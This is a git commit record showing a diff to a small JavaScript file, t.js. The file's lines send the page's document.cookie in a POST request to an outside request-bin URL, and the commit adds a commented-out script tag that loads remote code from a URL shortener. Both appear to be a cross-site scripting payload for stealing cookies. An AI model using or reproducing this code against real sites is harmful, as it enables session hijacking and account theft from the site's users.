50ba551605386707e7a9525fdd1ba91d86392ef6
golost2202 <50000521+golost2202@users.noreply.github.com>
2020-01-21 13:00:52 +0000

    Update t.js

--- t.js
+++ t.js
@@ -2,3 +2,4 @@ var xhr = new XMLHttpRequest();
 xhr.open('POST', 'https://postb.in/1579610702544-2913057364057', true);
 xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 xhr.send(document.cookie);
+//<script src=https://tinyurl.com/tg4rv5u></script>
